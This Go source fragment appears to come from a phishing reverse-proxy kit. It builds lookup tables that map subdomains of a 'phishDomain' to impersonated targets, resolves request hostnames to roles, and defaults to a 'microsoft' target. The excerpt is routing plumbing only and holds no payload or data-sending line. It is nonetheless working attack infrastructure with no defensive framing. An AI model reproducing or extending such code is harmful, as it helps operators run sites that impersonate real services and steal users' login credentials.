// ══════════════════════════════════════════════════════════
//  HOST RESOLUTION + LOOKUPS
// ══════════════════════════════════════════════════════════

var (
	roleMu     sync.RWMutex
	roleSet    = map[string]bool{}
	roleLookup = map[string]*Target{}

	subdomainLookup = map[string]*Target{}
)

func initTargets() {
	for _, t := range targets {
		t.materializeDefault()
		for prefix := range t.Subdomains {
			subdomainLookup[prefix+"."+phishDomain] = t
			roleLookup[prefix] = t
			roleSet[prefix] = true
		}
	}
	roleSet[landingRole] = true
}

func landingHostFor(baseDomain string) string {
	return landingRole + "." + baseDomain
}

func stripPort(host string) string {
	if i := strings.Index(host, ":"); i != -1 {
		return host[:i]
	}
	return host
}

func resolveHost(host string) (role, baseDomain string, isRole bool) {
	host = stripPort(strings.ToLower(strings.TrimSpace(host)))
	if i := strings.Index(host, "."); i != -1 {
		leftmost, rest := host[:i], host[i+1:]
		roleMu.RLock()
		known := roleSet[leftmost]
		roleMu.RUnlock()
		if known && rest != "" {
			return leftmost, rest, true
		}
	}
	base := host
	if strings.HasPrefix(base, "www.") {
		base = base[4:]
	}
	return "", base, false
}

func lookupTargetByRole(role string) *Target {
	roleMu.RLock()
	t, ok := roleLookup[role]
	roleMu.RUnlock()
	if ok {
		return t
	}
	return targets["microsoft"]
}

func lookupTarget(host string) *Target {
	if t, ok := subdomainLookup[host]; ok {
		return t
	}
	if t, ok := lookupDynamicTarget(host); ok {
		return t
	}
	return targets["microsoft"]
}
